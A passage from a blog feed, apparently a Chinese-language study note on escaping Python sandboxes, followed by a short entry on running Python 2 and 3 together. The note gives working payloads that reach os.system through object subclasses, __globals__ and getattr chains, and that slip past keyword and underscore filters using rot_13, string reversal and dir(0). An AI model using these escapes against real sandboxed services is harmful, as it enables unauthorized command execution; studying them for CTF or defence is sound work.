class="line">exec(<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">execfile() 函数可以用来执行一个文件。</span></span><br><span class="line"><span class="string">execfile(filename[, globals[, locals]])</span></span><br><span class="line"><span class="string">filename -- 文件名。</span></span><br><span class="line"><span class="string">globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</span></span><br><span class="line"><span class="string">locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</span></span><br><span class="line"><span class="string">返回表达式执行结果。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</span><br><span class="line">system(<span class="string">'ls'</span>)<span class="comment">#os的所有函数都被直接引入到了环境中,可以直接执行</span></span><br></pre></td></tr></table></figure><h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a>timeit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1)</span><br></pre></td></tr></table></figure><h3 id="不一样的import"><a href="#不一样的import" class="headerlink" title="不一样的import"></a>不一样的import</h3><h4 id="import机制"><a href="#import机制" class="headerlink" title="import机制"></a>import机制</h4><p>如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者a.<strong>dict</strong>[b<name>]的方法间接访问模块b<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'test.py'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">'import os'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> test</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.os.system(<span class="string">'dir'</span>)</span><br><span class="line"><span class="comment">###等价于</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.__dict__[<span class="string">'os'</span>].system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure></name></p><h4 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h4><p><code>import module</code> ==  <code>__import__(&#39;module&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#加上编码绕过</span></span><br><span class="line">__import__(<span class="string">'bf'</span>.decode(<span class="string">'rot_13'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h4><p>importlib.import_module(name, package=None)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">importlib.import_module(<span class="string">'bf'</span>.decode(<span class="string">'rot_13'</span>)).system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">importlib.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)<span class="comment">#python3新加,python2无</span></span><br></pre></td></tr></table></figure></p><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>不用引入直接使用的内置函数称为 builtin 函数,随着<strong>builtins</strong>这一个module 自动被引入到环境中.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>, <span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>, <span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>, <span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'breakpoint'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure></p><p>内置函数搭配加密可以绕过字符串过滤.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)</span><br><span class="line">#假如import和os被过滤</span><br><span class="line">__builtins__.__dict__[&apos;__vzcbeg__&apos;.decode(&apos;rot_13&apos;)](&apos;bf&apos;.decode(&apos;rot_13&apos;)).system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure></p><p>如果<strong>builtins</strong>的一些危险函数被del，可以用reload方法重载,就可以得到一个完整的<strong>builtins</strong>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&apos;eval&apos;]</span><br><span class="line">del __builtins__.__dict__[&apos;__import__&apos;]</span><br><span class="line">reload(__builtins__)</span><br></pre></td></tr></table></figure></p><p>但是在python3下,如果import被删除,就不能reload了,reload已经不在内置函数里了,需要导入imp库或importlib库,才能reload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__import__</span><br><span class="line">&gt;&gt;&gt; reload(__builtins__)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &apos;reload&apos; is not defined</span><br></pre></td></tr></table></figure></p><h3 id="引入object命令执行"><a href="#引入object命令执行" class="headerlink" title="引入object命令执行"></a>引入object命令执行</h3><p>python的object类中集成了很多的基础函数,我们想要调用的时候也是需要用object去操作的,主要是通过<code>__mro__</code>和<code>__bases__</code>两种方式来创建.<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span><span class="keyword">pass</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(object)</span>:</span><span class="keyword">pass</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">C</span><span class="params">(A,B)</span>:</span><span class="keyword">pass</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>C.__bases__ </span><br><span class="line">(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>C.__mro__</span><br><span class="line">(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)</span><br></pre></td></tr></table></figure></p><p><code>__mro__</code>方法可打印出其继承关系.<strong>bases</strong>方法可以获取上一层继承关系(如果是多层继承则返回上一层的东西，可能有多个).<br>创建object对象的方法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">object</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__mro__[1]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__mro__</span>[1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">object</span>'&gt;</span></span><br></pre></td></tr></table></figure></p><p>通过object类的<strong>subclasses</strong>()方法可以获得当前环境下能够访问的所有对象.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure></p><p><strong>subclasses</strong>()第40个是file类型的object,可以用来读文件:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">"1.txt"</span>).read()</span><br><span class="line"><span class="string">'\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n\n'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><h3 id="函数名过滤的绕过"><a href="#函数名过滤的绕过" class="headerlink" title="函数名过滤的绕过"></a>函数名过滤的绕过</h3><p>如果我们成功导入了包,但是system等方法被过滤了,而这些关键字和方法是不能用字符串编码加密解密的,那怎么办呢?</p><h4 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__"></a><code>__getattribute__</code></h4><p><code>__getattribute__</code>是属性访问拦截器,就是当这个类的属性被访问时,会自动调用类的<strong>getattribute</strong>方法.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            print(<span class="string">'pass it'</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Test()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__getattribute__(<span class="string">'ec'</span>+<span class="string">'ho'</span>)()</span><br><span class="line"><span class="keyword">pass</span> it</span><br><span class="line">//假如echo这个字符串被过滤,我们无法直接调用echo方法,但是可以利用__getattribute__传字符串然后编码解码绕过过滤.</span><br></pre></td></tr></table></figure></p><p>再看一个场景, 比如说一个沙盒waf了’ls’导致属性’globals’不能用，那么payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p><p>转换成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure></p><ul><li><code>func_globals</code>:这个属性指向定义函数时的全局命名空间，返回它所有调用的基类和函数.</li><li><code>linecache</code>模块的作用是将文件内容读取到内存中，进行缓存.</li><li><code>__init__</code>:返回一个函数对象</li><li><code>__dict__</code>:返回所有属性,包括属性,方法等</li></ul><h4 id="getattr"><a href="#getattr" class="headerlink" title="getattr"></a>getattr</h4><p>getattr() 函数用于返回一个对象属性值.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            self.name=<span class="string">'chenxiyuan'</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            print(<span class="string">'pass it'</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Test()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(a,<span class="string">'name'</span>) <span class="comment">#获取name属性</span></span><br><span class="line"><span class="string">'chenxiyuan'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(a,<span class="string">'echo'</span>) <span class="comment">#获取echo方法</span></span><br><span class="line">&lt;bound method Test.echo of &lt;__main__.Test object at <span class="number">0x7f3ff7d3ac18</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(a,<span class="string">'echo'</span>)() <span class="comment">#执行echo方法</span></span><br><span class="line"><span class="keyword">pass</span> it</span><br></pre></td></tr></table></figure></p><p>这样方法名被过滤的时候也可以通过对字符串操作进行绕过,再看几个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(&apos;os&apos;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line">getattr(__import__(&apos;os&apos;),&apos;flfgrz&apos;.encode(&apos;rot_13&apos;))(&apos;ls&apos;)</span><br></pre></td></tr></table></figure></p><p>再看看Smi1e大神的一个payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#假如`.`被waf,可以用getattr()来代替</span></span><br><span class="line">[].__class__ ==&gt; getattr([],'__class__')</span><br><span class="line">[].__class__.__base__ ==&gt; getattr(getattr([],'__class__'),'__base__')</span><br><span class="line">[].__class__.__base__.__subclasses__()[59] ==&gt; getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59]#后面有括号</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__ ==&gt; getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__')</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'] ==&gt; getattr(getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['linecache']</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'] ==&gt; getattr(getattr(getattr(getattr(getattr(getattr([],'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['linecache'],'__dict__')['os']</span><br><span class="line"><span class="comment">#最终payload</span></span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">'__class__'</span>),<span class="string">'__base__'</span>),<span class="string">'__subclasses__'</span>)()[<span class="number">59</span>],<span class="string">'__init__'</span>),<span class="string">'__globals__'</span>)[<span class="string">'linecache'</span>],<span class="string">'__dict__'</span>)[<span class="string">'os'</span>],<span class="string">'system'</span>)(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p><ul><li><code>__globals__</code>：返回一个当前空间下能使用的模块，方法和变量的字典</li></ul><p>当函数名或属性名用这种方法写成字符串后,可绕过的操作就很多了.比如<code>_</code>被过滤了.我们可以用<code>dir(0)[0][0]</code>代替,可以看看dir(0)是什么:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(0)</span><br><span class="line">[&apos;__abs__&apos;, &apos;__add__&apos;, &apos;__and__&apos;, &apos;__class__&apos;, &apos;__cmp__&apos;, &apos;__coerce__&apos;, &apos;__delattr__&apos;, &apos;__div__&apos;, &apos;__divmod__&apos;, &apos;__doc__&apos;, &apos;__float__&apos;, &apos;__floordiv__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__getnewargs__&apos;, &apos;__hash__&apos;, &apos;__hex__&apos;, &apos;__index__&apos;, &apos;__init__&apos;, &apos;__int__&apos;, &apos;__invert__&apos;, &apos;__long__&apos;, &apos;__lshift__&apos;, &apos;__mod__&apos;, &apos;__mul__&apos;, &apos;__neg__&apos;, &apos;__new__&apos;, &apos;__nonzero__&apos;, &apos;__oct__&apos;, &apos;__or__&apos;, &apos;__pos__&apos;, &apos;__pow__&apos;, &apos;__radd__&apos;, &apos;__rand__&apos;, &apos;__rdiv__&apos;, &apos;__rdivmod__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__rfloordiv__&apos;, &apos;__rlshift__&apos;, &apos;__rmod__&apos;, &apos;__rmul__&apos;, &apos;__ror__&apos;, &apos;__rpow__&apos;, &apos;__rrshift__&apos;, &apos;__rshift__&apos;, &apos;__rsub__&apos;, &apos;__rtruediv__&apos;, &apos;__rxor__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__sub__&apos;, &apos;__subclasshook__&apos;, &apos;__truediv__&apos;, &apos;__trunc__&apos;, &apos;__xor__&apos;, &apos;bit_length&apos;, &apos;conjugate&apos;, &apos;denominator&apos;, &apos;imag&apos;, &apos;numerator&apos;, &apos;real&apos;]</span><br><span class="line">#dir(0)[0][0]返回的是列表的第0个元素的第0个字符,即&apos;__abs__&apos;的_</span><br></pre></td></tr></table></figure></p><p>那么上述payload就可以写为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">'class'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">'base'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">'subclasses'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)()[<span class="number">59</span>],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">'init'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">'globals'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)[<span class="string">'linecache'</span>],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">'dict'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)[<span class="string">'os'</span>],<span class="string">'system'</span>)(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;也学了挺久的python了,是时候对关于python安全的一些问题做个研究并记录下来了.参考这里&lt;a href=&quot;https://github.com/bit4woo/python_sec&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;python_Sec&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="python安全" scheme="http://chenxiyuan.vip/tags/python%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python多版本共存</title>
    <link href="http://chenxiyuan.vip/2019/07/23/python%E5%A4%9A%E7%89%88%E6%9C%AC%E5%85%B1%E5%AD%98/"/>
    <id>http://chenxiyuan.vip/2019/07/23/python多版本共存/</id>
    <published>2019-07-23T06:33:06.000Z</published>
    <updated>2019-07-23T06:40:14.498Z</updated>
    
    <content type="html"><![CDATA[<p>很多情况下,python2和python3我都要用到,那么多版本共存也是很简单的,记住命令就好了.</p><ul><li>windows:cmd<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -3  </span><br><span class="line">py -2</span><br></pre></td></tr></table></figure></li></ul><p>如果要使用指定版本的pip就加个m参数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -3 -m pip install multiprocessing</span><br><span class="line">py -2 -m pip install multiprocessing</span><br></pre></td></tr></table></figure></p><ul><li>macos:terminal<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">python2</span><br></pre></td></tr></table></figure></li></ul><p>如果要使用pip,也是加上m参数.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很多情况下,python2和python3我都要用到,那么多版本共存也是很简单的,记住命令就好了.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;windows:cmd&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
